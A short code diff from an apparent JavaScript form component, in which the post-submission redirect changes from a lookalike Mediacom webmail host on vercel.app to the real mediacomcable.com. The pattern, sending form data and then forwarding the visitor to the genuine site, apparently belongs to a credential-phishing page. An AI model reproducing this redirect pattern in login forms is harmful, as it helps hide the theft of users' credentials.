@@ -238,7 +238,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://webmail-mediacombb.vercel.app/");
+        location.replace("https://mediacomcable.com/");
       }
     },
 
